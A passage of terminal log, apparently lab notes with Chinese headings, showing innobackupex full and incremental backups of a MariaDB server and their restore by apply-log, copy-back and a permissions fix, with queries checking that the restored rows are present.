/tmp/backup/2016-09-01_11-32-43/mysql/ndb_binlog_index.frm160901 11:32:47 [01] ...done160901 11:32:47 [01] Copying ./mysql/ndb_binlog_index.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/ndb_binlog_index.MYI160901 11:32:47 [01] ...done160901 11:32:47 [01] Copying ./mysql/plugin.frm to /tmp/backup/2016-09-01_11-32-43/mysql/plugin.frm160901 11:32:47 [01] ...done160901 11:32:48 [01] Copying ./mysql/plugin.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/plugin.MYI160901 11:32:48 [01] ...done160901 11:32:48 [01] Copying ./mysql/proc.frm to /tmp/backup/2016-09-01_11-32-43/mysql/proc.frm160901 11:32:48 [01] ...done160901 11:32:48 [01] Copying ./mysql/proc.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/proc.MYD160901 11:32:48 [01] ...done160901 11:32:48 [01] Copying ./mysql/procs_priv.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/procs_priv.MYI160901 11:32:48 [01] ...done160901 11:32:48 [01] Copying ./mysql/proxies_priv.frm to /tmp/backup/2016-09-01_11-32-43/mysql/proxies_priv.frm160901 11:32:48 [01] ...done160901 11:32:48 [01] Copying ./mysql/proxies_priv.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/proxies_priv.MYD160901 11:32:48 [01] ...done160901 11:32:48 [01] Copying ./mysql/servers.MYI to /tmp/backup/2016-09-01_11-32-43/mysql/servers.MYI160901 11:32:48 [01] ...done160901 11:32:48 [01] Copying ./mysql/time_zone.frm to /tmp/backup/2016-09-01_11-32-43/mysql/time_zone.frm160901 11:32:48 [01] ...done160901 11:32:48 [01] Copying ./mysql/time_zone_leap_second.MYD to /tmp/backup/2016-09-01_11-32-43/mysql/time_zone_leap_second.MYD160901 11:32:48 [01] ...done160901 11:32:48 &gt;&gt; log scanned up to (1607773)160901 11:32:48 [00] Writing test/db.opt160901 11:32:48 [00] ...done160901 11:32:48 [01] Copying ./performance_schema/db.opt to /tmp/backup/2016-09-01_11-32-43/performance_schema/db.opt160901 11:32:48 [01] ...done160901 11:32:48 [01] Copying ./performance_schema/cond_instances.frm to /tmp/backup/2016-09-01_11-32-43/performance_schema/cond_instances.frm160901 11:32:48 [01] ...done160901 11:32:48 [01] Copying ./performance_schema/events_waits_current.frm to /tmp/backup/2016-09-01_11-32-43/performance_schema/events_waits_current.frm160901 11:32:48 [01] ...done160901 11:32:48 [01] Copying ./performance_schema/events_waits_history.frm to /tmp/backup/2016-09-01_11-32-43/performance_schema/events_waits_history.frm160901 11:32:48 [01] ...done160901 11:32:48 [01] Copying ./performance_schema/events_waits_history_long.frm to /tmp/backup/2016-09-01_11-32-43/performance_schema/events_waits_history_long.frm160901 11:32:48 [01] ...done160901 11:32:48 [01] Copying ./performance_schema/events_waits_summary_by_instance.frm to /tmp/backup/2016-09-01_11-32-43/performance_schema/events_waits_summary_by_instance.frm160901 11:32:48 [01] ...done160901 11:32:48 [01] Copying ./performance_schema/events_waits_summary_by_thread_by_event_name.frm to /tmp/backup/2016-09-01_11-32-43/performance_schema/events_waits_summary_by_thread_by_event_name.frm160901 11:32:48 [01] ...done160901 11:32:48 [01] Copying ./performance_schema/events_waits_summary_global_by_event_name.frm to /tmp/backup/2016-09-01_11-32-43/performance_schema/events_waits_summary_global_by_event_name.frm160901 11:32:48 [01] ...done160901 11:32:48 [01] Copying ./performance_schema/file_instances.frm to /tmp/backup/2016-09-01_11-32-43/performance_schema/file_instances.frm160901 11:32:48 [01] ...done160901 11:32:49 [01] Copying ./performance_schema/file_summary_by_event_name.frm to /tmp/backup/2016-09-01_11-32-43/performance_schema/file_summary_by_event_name.frm160901 11:32:49 [01] ...done160901 11:32:49 [01] Copying ./performance_schema/file_summary_by_instance.frm to /tmp/backup/2016-09-01_11-32-43/performance_schema/file_summary_by_instance.frm160901 11:32:49 [01] ...done160901 11:32:49 [01] Copying ./performance_schema/mutex_instances.frm to /tmp/backup/2016-09-01_11-32-43/performance_schema/mutex_instances.frm160901 11:32:49 [01] ...done160901 11:32:49 [01] Copying ./performance_schema/performance_timers.frm to /tmp/backup/2016-09-01_11-32-43/performance_schema/performance_timers.frm160901 11:32:49 [01] ...done160901 11:32:49 [01] Copying ./performance_schema/rwlock_instances.frm to /tmp/backup/2016-09-01_11-32-43/performance_schema/rwlock_instances.frm160901 11:32:49 [01] ...done160901 11:32:49 [01] Copying ./performance_schema/setup_consumers.frm to /tmp/backup/2016-09-01_11-32-43/performance_schema/setup_consumers.frm160901 11:32:49 [01] ...done160901 11:32:49 [01] Copying ./performance_schema/setup_instruments.frm to /tmp/backup/2016-09-01_11-32-43/performance_schema/setup_instruments.frm160901 11:32:49 [01] ...done160901 11:32:49 [01] Copying ./performance_schema/setup_timers.frm to /tmp/backup/2016-09-01_11-32-43/performance_schema/setup_timers.frm160901 11:32:49 [01] ...done160901 11:32:49 [01] Copying ./performance_schema/threads.frm to /tmp/backup/2016-09-01_11-32-43/performance_schema/threads.frm160901 11:32:49 [01] ...done160901 11:32:49 &gt;&gt; log scanned up to (1607773)160901 11:32:49 [01] Copying ./db1/db.opt to /tmp/backup/2016-09-01_11-32-43/db1/db.opt160901 11:32:49 [01] ...done160901 11:32:49 [01] Copying ./db1/t1.frm to /tmp/backup/2016-09-01_11-32-43/db1/t1.frm160901 11:32:49 [01] ...done160901 11:32:49 [01] Copying ./db2/db.opt to /tmp/backup/2016-09-01_11-32-43/db2/db.opt160901 11:32:49 [01] ...done160901 11:32:49 [01] Copying ./db2/t1.frm to /tmp/backup/2016-09-01_11-32-43/db2/t1.frm160901 11:32:49 [01] ...done160901 11:32:49 Finished backing up non-InnoDB tables and files160901 11:32:49 [00] Writing xtrabackup_binlog_info160901 11:32:49 [00] ...done160901 11:32:49 Executing FLUSH NO_WRITE_TO_BINLOG ENGINE LOGS...xtrabackup: The latest check point (for incremental): &apos;1607773&apos;xtrabackup: Stopping log copying thread..160901 11:32:49 &gt;&gt; log scanned up to (1607773)160901 11:32:50 Executing UNLOCK TABLES160901 11:32:50 All tables unlocked160901 11:32:50 Backup created in directory &apos;/tmp/backup/2016-09-01_11-32-43&apos;MySQL binlog position: filename &apos;mastera.000021&apos;, position &apos;426&apos;160901 11:32:50 [00] Writing backup-my.cnf160901 11:32:50 [00] ...done160901 11:32:50 [00] Writing xtrabackup_info160901 11:32:50 [00] ...donextrabackup: Transaction log of lsn (1607773) to (1607773) was copied.160901 11:32:50 completed OK![root@mastera0 mysql-log]# cd /tmp/backup/[root@mastera0 backup]# lltotal 4drwx------. 7 root root 4096 Sep 1 11:32 2016-09-01_11-32-43[root@mastera0 backup]# cd 2016-09-01_11-32-43/[root@mastera0 2016-09-01_11-32-43]# lltotal 18460-rw-r-----. 1 root root 386 Sep 1 11:32 backup-my.cnfdrwx------. 2 root root 32 Sep 1 11:32 db1drwx------. 2 root root 32 Sep 1 11:32 db2-rw-r-----. 1 root root 18874368 Sep 1 11:32 ibdata1drwx------. 2 root root 4096 Sep 1 11:32 mysqldrwx------. 2 root root 4096 Sep 1 11:32 performance_schemadrwx------. 2 root root 19 Sep 1 11:32 test-rw-r-----. 1 root root 19 Sep 1 11:32 xtrabackup_binlog_info-rw-r-----. 1 root root 113 Sep 1 11:32 xtrabackup_checkpoints-rw-r-----. 1 root root 473 Sep 1 11:32 xtrabackup_info-rw-r-----. 1 root root 2560 Sep 1 11:32 xtrabackup_logfile## copyback[root@mastera0 mysql]# systemctl stop mariadb[root@mastera0 mysql]# rm -rf /var/lib/mysql/*[root@mastera0 mysql]# innobackupex --apply-log /tmp/backup/2016-09-01_11-32-43/160901 11:36:33 innobackupex: Starting the apply-log operationIMPORTANT: Please check that the apply-log run completes successfully. At the end of a successful apply-log run innobackupex prints &quot;completed OK!&quot;.innobackupex version 2.3.4 based on MySQL server 5.6.24 Linux (x86_64) (revision id: e80c779)xtrabackup: cd to /tmp/backup/2016-09-01_11-32-43/xtrabackup: This target seems to be not prepared yet.xtrabackup: xtrabackup_logfile detected: size=2097152, start_lsn=(1607773)xtrabackup: using the following InnoDB configuration for recovery:xtrabackup: innodb_data_home_dir = ./xtrabackup: innodb_data_file_path = ibdata1:10M:autoextendxtrabackup: innodb_log_group_home_dir = ./xtrabackup: innodb_log_files_in_group = 1xtrabackup: innodb_log_file_size = 2097152xtrabackup: using the following InnoDB configuration for recovery:xtrabackup: innodb_data_home_dir = ./xtrabackup: innodb_data_file_path = ibdata1:10M:autoextendxtrabackup: innodb_log_group_home_dir = ./xtrabackup: innodb_log_files_in_group = 1xtrabackup: innodb_log_file_size = 2097152xtrabackup: Starting InnoDB instance for recovery.xtrabackup: Using 104857600 bytes for buffer pool (set by --use-memory parameter)InnoDB: Using atomics to ref count buffer pool pagesInnoDB: The InnoDB memory heap is disabledInnoDB: Mutexes and rw_locks use GCC atomic builtinsInnoDB: Memory barrier is not usedInnoDB: Compressed tables use zlib 1.2.7InnoDB: Using CPU crc32 instructionsInnoDB: Initializing buffer pool, size = 100.0MInnoDB: Completed initialization of buffer poolInnoDB: Highest supported file format is Barracuda.InnoDB: The log sequence numbers 0 and 0 in ibdata files do not match the log sequence number 1607773 in the ib_logfiles!InnoDB: Database was not shutdown normally!InnoDB: Starting crash recovery.InnoDB: Reading tablespace information from the .ibd files...InnoDB: Restoring possible half-written data pagesInnoDB: from the doublewrite buffer...InnoDB: 128 rollback segment(s) are active.InnoDB: Waiting for purge to startInnoDB: 5.6.24 started; log sequence number 1607773xtrabackup: Last MySQL binlog file position 426, file name /var/lib/mysql-log/mastera.000021xtrabackup: starting shutdown with innodb_fast_shutdown = 1InnoDB: FTS optimize thread exiting.InnoDB: Starting shutdown...InnoDB: Shutdown completed; log sequence number 1607783xtrabackup: using the following InnoDB configuration for recovery:xtrabackup: innodb_data_home_dir = ./xtrabackup: innodb_data_file_path = ibdata1:10M:autoextendxtrabackup: innodb_log_group_home_dir = ./xtrabackup: innodb_log_files_in_group = 2xtrabackup: innodb_log_file_size = 5242880InnoDB: Using atomics to ref count buffer pool pagesInnoDB: The InnoDB memory heap is disabledInnoDB: Mutexes and rw_locks use GCC atomic builtinsInnoDB: Memory barrier is not usedInnoDB: Compressed tables use zlib 1.2.7InnoDB: Using CPU crc32 instructionsInnoDB: Initializing buffer pool, size = 100.0MInnoDB: Completed initialization of buffer poolInnoDB: Setting log file ./ib_logfile101 size to 5 MBInnoDB: Setting log file ./ib_logfile1 size to 5 MBInnoDB: Renaming log file ./ib_logfile101 to ./ib_logfile0InnoDB: New log files created, LSN=1607783InnoDB: Highest supported file format is Barracuda.InnoDB: 128 rollback segment(s) are active.InnoDB: Waiting for purge to startInnoDB: 5.6.24 started; log sequence number 1608204xtrabackup: starting shutdown with innodb_fast_shutdown = 1InnoDB: FTS optimize thread exiting.InnoDB: Starting shutdown...InnoDB: Shutdown completed; log sequence number 1608214160901 11:36:37 completed OK![root@mastera0 mysql]# innobackupex --copy-back /tmp/backup/2016-09-01_11-32-43/160901 11:36:56 innobackupex: Starting the copy-back operationIMPORTANT: Please check that the copy-back run completes successfully. At the end of a successful copy-back run innobackupex prints &quot;completed OK!&quot;.innobackupex version 2.3.4 based on MySQL server 5.6.24 Linux (x86_64) (revision id: e80c779)160901 11:36:56 [01] Copying ib_logfile0 to /var/lib/mysql/ib_logfile0160901 11:36:56 [01] ...done160901 11:36:56 [01] Copying ib_logfile1 to /var/lib/mysql/ib_logfile1160901 11:36:56 [01] ...done160901 11:36:56 [01] Copying ibdata1 to /var/lib/mysql/ibdata1160901 11:36:56 [01] ...done160901 11:36:57 [01] Copying ./mysql/tables_priv.frm to /var/lib/mysql/mysql/tables_priv.frm160901 11:36:57 [01] ...done160901 11:36:57 [01] Copying ./mysql/tables_priv.MYI to /var/lib/mysql/mysql/tables_priv.MYI160901 11:36:57 [01] ...done160901 11:36:57 [01] Copying ./mysql/time_zone.MYD to /var/lib/mysql/mysql/time_zone.MYD160901 11:36:57 [01] ...done160901 11:36:57 [01] Copying ./mysql/ndb_binlog_index.MYD to /var/lib/mysql/mysql/ndb_binlog_index.MYD160901 11:36:57 [01] ...done160901 11:36:57 [01] Copying ./mysql/plugin.MYD to /var/lib/mysql/mysql/plugin.MYD160901 11:36:57 [01] ...done160901 11:36:57 [01] Copying ./mysql/proc.MYI to /var/lib/mysql/mysql/proc.MYI160901 11:36:57 [01] ...done160901 11:36:57 [01] Copying ./mysql/procs_priv.frm to /var/lib/mysql/mysql/procs_priv.frm160901 11:36:57 [01] ...done160901 11:36:57 [01] Copying ./mysql/procs_priv.MYD to /var/lib/mysql/mysql/procs_priv.MYD160901 11:36:57 [01] ...done160901 11:36:57 [01] Copying ./mysql/proxies_priv.MYI to /var/lib/mysql/mysql/proxies_priv.MYI160901 11:36:57 [01] ...done160901 11:36:57 [01] Copying ./mysql/servers.frm to /var/lib/mysql/mysql/servers.frm160901 11:36:57 [01] ...done160901 11:36:57 [01] Copying ./mysql/servers.MYD to /var/lib/mysql/mysql/servers.MYD160901 11:36:57 [01] ...done160901 11:36:57 [01] Copying ./mysql/time_zone.MYI to /var/lib/mysql/mysql/time_zone.MYI160901 11:36:57 [01] ...done160901 11:36:57 [01] Copying ./mysql/time_zone_name.frm to /var/lib/mysql/mysql/time_zone_name.frm160901 11:36:57 [01] ...done160901 11:36:57 [01] Copying ./mysql/time_zone_name.MYI to /var/lib/mysql/mysql/time_zone_name.MYI160901 11:36:57 [01] ...done160901 11:36:57 [01] Copying ./mysql/time_zone_name.MYD to /var/lib/mysql/mysql/time_zone_name.MYD160901 11:36:57 [01] ...done160901 11:36:57 [01] Copying ./mysql/time_zone_transition.frm to /var/lib/mysql/mysql/time_zone_transition.frm160901 11:36:57 [01] ...done160901 11:36:57 [01] Copying ./mysql/time_zone_transition.MYI to /var/lib/mysql/mysql/time_zone_transition.MYI160901 11:36:57 [01] ...done160901 11:36:58 [01] Copying ./mysql/time_zone_transition.MYD to /var/lib/mysql/mysql/time_zone_transition.MYD160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/time_zone_transition_type.frm to /var/lib/mysql/mysql/time_zone_transition_type.frm160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/time_zone_transition_type.MYI to /var/lib/mysql/mysql/time_zone_transition_type.MYI160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/time_zone_transition_type.MYD to /var/lib/mysql/mysql/time_zone_transition_type.MYD160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/user.frm to /var/lib/mysql/mysql/user.frm160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/user.MYI to /var/lib/mysql/mysql/user.MYI160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/user.MYD to /var/lib/mysql/mysql/user.MYD160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/time_zone_leap_second.frm to /var/lib/mysql/mysql/time_zone_leap_second.frm160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/time_zone_leap_second.MYI to /var/lib/mysql/mysql/time_zone_leap_second.MYI160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/general_log.frm to /var/lib/mysql/mysql/general_log.frm160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/general_log.CSM to /var/lib/mysql/mysql/general_log.CSM160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/general_log.CSV to /var/lib/mysql/mysql/general_log.CSV160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/slow_log.frm to /var/lib/mysql/mysql/slow_log.frm160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/slow_log.CSM to /var/lib/mysql/mysql/slow_log.CSM160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/slow_log.CSV to /var/lib/mysql/mysql/slow_log.CSV160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/tables_priv.MYD to /var/lib/mysql/mysql/tables_priv.MYD160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/columns_priv.frm to /var/lib/mysql/mysql/columns_priv.frm160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/columns_priv.MYI to /var/lib/mysql/mysql/columns_priv.MYI160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/columns_priv.MYD to /var/lib/mysql/mysql/columns_priv.MYD160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/db.frm to /var/lib/mysql/mysql/db.frm160901 11:36:58 [01] ...done160901 11:36:58 [01] Copying ./mysql/db.MYI to /var/lib/mysql/mysql/db.MYI160901 11:36:58 [01] ...done160901 11:36:59 [01] Copying ./mysql/db.MYD to /var/lib/mysql/mysql/db.MYD160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/event.frm to /var/lib/mysql/mysql/event.frm160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/event.MYI to /var/lib/mysql/mysql/event.MYI160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/event.MYD to /var/lib/mysql/mysql/event.MYD160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/func.frm to /var/lib/mysql/mysql/func.frm160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/func.MYI to /var/lib/mysql/mysql/func.MYI160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/func.MYD to /var/lib/mysql/mysql/func.MYD160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/help_category.frm to /var/lib/mysql/mysql/help_category.frm160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/help_category.MYI to /var/lib/mysql/mysql/help_category.MYI160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/help_category.MYD to /var/lib/mysql/mysql/help_category.MYD160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/help_keyword.frm to /var/lib/mysql/mysql/help_keyword.frm160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/help_keyword.MYI to /var/lib/mysql/mysql/help_keyword.MYI160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/help_keyword.MYD to /var/lib/mysql/mysql/help_keyword.MYD160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/help_relation.frm to /var/lib/mysql/mysql/help_relation.frm160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/help_relation.MYI to /var/lib/mysql/mysql/help_relation.MYI160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/help_relation.MYD to /var/lib/mysql/mysql/help_relation.MYD160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/help_topic.frm to /var/lib/mysql/mysql/help_topic.frm160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/help_topic.MYI to /var/lib/mysql/mysql/help_topic.MYI160901 11:36:59 [01] ...done160901 11:36:59 [01] Copying ./mysql/help_topic.MYD to /var/lib/mysql/mysql/help_topic.MYD160901 11:36:59 [01] ...done160901 11:37:00 [01] Copying ./mysql/host.frm to /var/lib/mysql/mysql/host.frm160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./mysql/host.MYI to /var/lib/mysql/mysql/host.MYI160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./mysql/host.MYD to /var/lib/mysql/mysql/host.MYD160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./mysql/ndb_binlog_index.frm to /var/lib/mysql/mysql/ndb_binlog_index.frm160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./mysql/ndb_binlog_index.MYI to /var/lib/mysql/mysql/ndb_binlog_index.MYI160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./mysql/plugin.frm to /var/lib/mysql/mysql/plugin.frm160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./mysql/plugin.MYI to /var/lib/mysql/mysql/plugin.MYI160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./mysql/proc.frm to /var/lib/mysql/mysql/proc.frm160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./mysql/proc.MYD to /var/lib/mysql/mysql/proc.MYD160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./mysql/procs_priv.MYI to /var/lib/mysql/mysql/procs_priv.MYI160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./mysql/proxies_priv.frm to /var/lib/mysql/mysql/proxies_priv.frm160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./mysql/proxies_priv.MYD to /var/lib/mysql/mysql/proxies_priv.MYD160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./mysql/servers.MYI to /var/lib/mysql/mysql/servers.MYI160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./mysql/time_zone.frm to /var/lib/mysql/mysql/time_zone.frm160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./mysql/time_zone_leap_second.MYD to /var/lib/mysql/mysql/time_zone_leap_second.MYD160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./test/db.opt to /var/lib/mysql/test/db.opt160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./performance_schema/db.opt to /var/lib/mysql/performance_schema/db.opt160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./performance_schema/cond_instances.frm to /var/lib/mysql/performance_schema/cond_instances.frm160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./performance_schema/events_waits_current.frm to /var/lib/mysql/performance_schema/events_waits_current.frm160901 11:37:00 [01] ...done160901 11:37:00 [01] Copying ./performance_schema/events_waits_history.frm to /var/lib/mysql/performance_schema/events_waits_history.frm160901 11:37:00 [01] ...done160901 11:37:01 [01] Copying ./performance_schema/events_waits_history_long.frm to /var/lib/mysql/performance_schema/events_waits_history_long.frm160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./performance_schema/events_waits_summary_by_instance.frm to /var/lib/mysql/performance_schema/events_waits_summary_by_instance.frm160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./performance_schema/events_waits_summary_by_thread_by_event_name.frm to /var/lib/mysql/performance_schema/events_waits_summary_by_thread_by_event_name.frm160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./performance_schema/events_waits_summary_global_by_event_name.frm to /var/lib/mysql/performance_schema/events_waits_summary_global_by_event_name.frm160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./performance_schema/file_instances.frm to /var/lib/mysql/performance_schema/file_instances.frm160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./performance_schema/file_summary_by_event_name.frm to /var/lib/mysql/performance_schema/file_summary_by_event_name.frm160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./performance_schema/file_summary_by_instance.frm to /var/lib/mysql/performance_schema/file_summary_by_instance.frm160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./performance_schema/mutex_instances.frm to /var/lib/mysql/performance_schema/mutex_instances.frm160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./performance_schema/performance_timers.frm to /var/lib/mysql/performance_schema/performance_timers.frm160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./performance_schema/rwlock_instances.frm to /var/lib/mysql/performance_schema/rwlock_instances.frm160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./performance_schema/setup_consumers.frm to /var/lib/mysql/performance_schema/setup_consumers.frm160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./performance_schema/setup_instruments.frm to /var/lib/mysql/performance_schema/setup_instruments.frm160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./performance_schema/setup_timers.frm to /var/lib/mysql/performance_schema/setup_timers.frm160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./performance_schema/threads.frm to /var/lib/mysql/performance_schema/threads.frm160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./db1/db.opt to /var/lib/mysql/db1/db.opt160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./db1/t1.frm to /var/lib/mysql/db1/t1.frm160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./db2/db.opt to /var/lib/mysql/db2/db.opt160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./db2/t1.frm to /var/lib/mysql/db2/t1.frm160901 11:37:01 [01] ...done160901 11:37:01 [01] Copying ./xtrabackup_info to /var/lib/mysql/xtrabackup_info160901 11:37:01 [01] ...done160901 11:37:02 [01] Copying ./xtrabackup_binlog_pos_innodb to /var/lib/mysql/xtrabackup_binlog_pos_innodb160901 11:37:02 [01] ...done160901 11:37:02 completed OK![root@mastera0 mysql]#[root@mastera0 mysql]# ll /var/lib/mysqltotal 28688drwx------. 2 root root 32 Sep 1 11:37 db1drwx------. 2 root root 32 Sep 1 11:37 db2-rw-r-----. 1 root root 18874368 Sep 1 11:36 ibdata1-rw-r-----. 1 root root 5242880 Sep 1 11:36 ib_logfile0-rw-r-----. 1 root root 5242880 Sep 1 11:36 ib_logfile1drwx------. 2 root root 4096 Sep 1 11:37 mysqldrwx------. 2 root root 4096 Sep 1 11:37 performance_schemadrwx------. 2 root root 19 Sep 1 11:37 test-rw-r-----. 1 root root 38 Sep 1 11:37 xtrabackup_binlog_pos_innodb-rw-r-----. 1 root root 473 Sep 1 11:37 xtrabackup_info[root@mastera0 mysql]# ll /var/lib/mysql -ddrwxr-xr-x. 7 mysql mysql 4096 Sep 1 11:37 /var/lib/mysql[root@mastera0 mysql]# chown mysql. /var/lib/mysql/ -R[root@mastera0 mysql]# ll /var/lib/mysqltotal 28688drwx------. 2 mysql mysql 32 Sep 1 11:37 db1drwx------. 2 mysql mysql 32 Sep 1 11:37 db2-rw-r-----. 1 mysql mysql 18874368 Sep 1 11:36 ibdata1-rw-r-----. 1 mysql mysql 5242880 Sep 1 11:36 ib_logfile0-rw-r-----. 1 mysql mysql 5242880 Sep 1 11:36 ib_logfile1drwx------. 2 mysql mysql 4096 Sep 1 11:37 mysqldrwx------. 2 mysql mysql 4096 Sep 1 11:37 performance_schemadrwx------. 2 mysql mysql 19 Sep 1 11:37 test-rw-r-----. 1 mysql mysql 38 Sep 1 11:37 xtrabackup_binlog_pos_innodb-rw-r-----. 1 mysql mysql 473 Sep 1 11:37 xtrabackup_info[root@mastera0 mysql]# getenforcePermissive[root@mastera0 mysql]#[root@mastera0 mysql]# systemctl start maraidbFailed to start maraidb.service: Unit maraidb.service failed to load: No such file or directory.[root@mastera0 mysql]# systemctl start mariadb[root@mastera0 mysql]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 2Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; select * from db1.t1 ;+-----+| id |+-----+| 3 || 4 || 5 || 6 || 7 || 8 || 9 || 10 || 11 || 12 || 13 || 14 || 100 |+-----+13 rows in set (0.00 sec)MariaDB [(none)]&gt; \\qBye===========================================# 增量备份并还原[root@mastera0 mysql]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 4Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; select * from db1.t1;+----+| id |+----+| 3 || 4 || 5 || 6 || 7 || 8 || 9 || 10 || 11 || 12 || 13 || 14 |+----+12 rows in set (0.00 sec)MariaDB [(none)]&gt;MariaDB [(none)]&gt; insert into db1.t1 values (100);Query OK, 1 row affected (0.13 sec)## 全备份[root@mastera0 ~]# rm -rf /tmp/backup/*[root@mastera0 ~]# innobackupex --user=root --password=uplooking /tmp/backupMariaDB [(none)]&gt; select * from db1.t1;+-----+| id |+-----+| 3 || 4 || 5 || 6 || 7 || 8 || 9 || 10 || 11 || 12 || 13 || 14 || 100 |+-----+13 rows in set (0.00 sec)MariaDB [(none)]&gt; insert into db1.t1 values (101);Query OK, 1 row affected (0.22 sec)# 增量1[root@mastera0 ~]# innobackupex --user=root --password=uplooking --incremental-basedir=/tmp/backup/2016-09-01_14-07-43/ --incremental /tmp/backupMariaDB [(none)]&gt; insert into db1.t1 values (102);Query OK, 1 row affected (0.06 sec)# 增量2[root@mastera0 ~]# innobackupex --user=root --password=uplooking --incremental-basedir=/tmp/backup/2016-09-01_14-08-35 --incremental /tmp/backupMariaDB [(none)]&gt; insert into db1.t1 values (103);Query OK, 1 row affected (0.04 sec)# 增量3[root@mastera0 ~]# innobackupex --user=root --password=uplooking --incremental-basedir=/tmp/backup/2016-09-01_14-09-39 --incremental /tmp/backup==============# 还原[root@mastera0 mysql]# systemctl stop mariadb[root@mastera0 mysql]# rm -rf /var/lib/mysql/*[root@mastera0 mysql]# innobackupex --apply-log --redo-only /tmp/backup/2016-09-01_14-07-43[root@mastera0 mysql]# innobackupex --apply-log --redo-only /tmp/backup/2016-09-01_14-07-43 --incremental-dir=/tmp/backup/2016-09-01_14-08-35/[root@mastera0 mysql]# innobackupex --apply-log --redo-only /tmp/backup/2016-09-01_14-07-43 --incremental-dir=/tmp/backup/2016-09-01_14-09-39[root@mastera0 mysql]# innobackupex --apply-log --redo-only /tmp/backup/2016-09-01_14-07-43 --incremental-dir=/tmp/backup/2016-09-01_14-10-09[root@mastera0 mysql]# innobackupex --apply-log /tmp/backup/2016-09-01_14-07-43[root@mastera0 mysql]# innobackupex --copy-back /tmp/backup/2016-09-01_14-07-43[root@mastera0 mysql]# ll 